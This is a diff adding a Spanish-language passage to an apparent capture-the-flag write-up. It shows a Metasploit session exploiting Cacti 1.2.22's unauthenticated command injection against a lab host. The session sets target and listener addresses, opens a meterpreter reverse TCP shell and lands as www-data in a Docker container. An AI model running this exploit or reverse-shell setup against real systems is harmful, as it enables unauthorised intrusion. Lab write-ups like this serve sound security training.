@@ -95,6 +95,69 @@ Cacti v1.2.22 - Remote Command Execution (RCE)                                  
 ---------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Shellcodes: No Results
 ```
+Realizamos una búsqueda del exploit correspondiente a la versión de Cacti en Metasploit. 
 
+Esta acción implica utilizar la plataforma Metasploit para buscar y localizar el exploit específico que se dirige a la versión del software Cacti que hemos identificado. Metasploit es un marco de desarrollo de pruebas de penetración que incluye una amplia gama de exploits y herramientas para evaluar la seguridad de sistemas y aplicaciones.
 
+Al buscar el exploit adecuado en Metasploit, podemos aprovechar sus capacidades para llevar a cabo pruebas de penetración controladas y evaluar la efectividad de las medidas de seguridad implementadas en el sistema afectado. Esto permite a los profesionales de seguridad informática comprender las posibles vulnerabilidades y tomar acciones correctivas para mitigar los riesgos asociados.
+
+En resumen, buscar el exploit de la versión de Cacti en Metasploit es un paso importante para evaluar la seguridad de este software en particular y determinar si existen vulnerabilidades conocidas que podrían ser aprovechadas por atacantes malintencionados.
+
+```javascript
+msf6 > search cacti
+
+Matching Modules
+================
+
+   #  Name                                                    Disclosure Date  Rank       Check  Description
+   -  ----                                                    ---------------  ----       -----  -----------
+   0  exploit/linux/http/cacti_unauthenticated_cmd_injection  2022-12-05       excellent  Yes    Cacti 1.2.22 unauthenticated command injection
+   1  exploit/unix/http/cacti_filter_sqli_rce                 2020-06-17       excellent  Yes    Cacti color filter authenticated SQLi to RCE
+   2  exploit/unix/webapp/cacti_graphimage_exec               2005-01-15       excellent  No     Cacti graph_view.php Remote Command Execution
+   3  exploit/windows/http/hp_sitescope_runomagentcommand     2013-07-29       manual     Yes    HP SiteScope Remote Code Execution
+
+Interact with a module by name or index. For example info 3, use 3 or use exploit/windows/http/hp_sitescope_runomagentcommand
+
+msf6 > use 0
+[*] Using configured payload linux/x86/meterpreter/reverse_tcp
+msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > 
+msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RHOSTS 10.129.188.45
+RHOSTS => 10.129.188.45
+msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set RPORT 80
+RPORT => 80
+msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > set LHOST 10.10.14.155
+LHOST => 10.10.14.155
+```
+Configuramos los parámetros RHOSTS, RPORT y LHOST, y procedemos a ejecutar el exploit en varias ocasiones, ya que su funcionamiento no es siempre consistente.
+
+Al poner en marcha el exploit, se requiere establecer los valores adecuados para los parámetros RHOSTS (host remoto), RPORT (puerto remoto) y LHOST (host local). Estos parámetros permiten al exploit interactuar con el sistema objetivo de manera precisa y establecer una conexión efectiva.
+
+Sin embargo, debido a la naturaleza de las vulnerabilidades y las diferentes configuraciones de los sistemas objetivo, es posible que el exploit no funcione de manera consistente en todos los intentos. Esto puede deberse a factores como medidas de seguridad adicionales, actualizaciones del software o configuraciones específicas del sistema.
+
+Por lo tanto, es necesario ejecutar el exploit varias veces, realizando ajustes y modificaciones necesarios en los parámetros y en la técnica utilizada. Este enfoque de prueba iterativa nos permite explorar diferentes opciones y abordajes hasta encontrar la combinación adecuada que logre el éxito en la explotación de la vulnerabilidad.
+
+En resumen, al poner en práctica los parámetros RHOSTS, RPORT y LHOST y ejecutar el exploit repetidamente, estamos adoptando un enfoque adaptativo para superar las posibles inconsistencias y dificultades que puedan surgir durante la explotación de la vulnerabilidad en cuestión.
+
+```javascript
+msf6 exploit(linux/http/cacti_unauthenticated_cmd_injection) > exploit
+
+[*] Started reverse TCP handler on 10.10.14.155:4444 
+[*] Running automatic check ("set AutoCheck false" to disable)
+[+] The target appears to be vulnerable. The target is Cacti version 1.2.22
+[*] Trying to bruteforce an exploitable host_id and local_data_id by trying up to 500 combinations
+[*] Enumerating local_data_id values for host_id 1
+[+] Found exploitable local_data_id 6 for host_id 1
+[*] Command Stager progress - 100.00% done (868/868 bytes)
+
+whoami
+www-data
+```
+Como podemos ver nos hemos conectado a un contenedor Docker y no a la máquina principal.
+
+```javascript
+www-data@50bca5e748b0:/var/www/html$ hostname -I
+hostname -I
+172.19.0.3 
+www-data@50bca5e748b0:/var/www/html$ 
+```
 
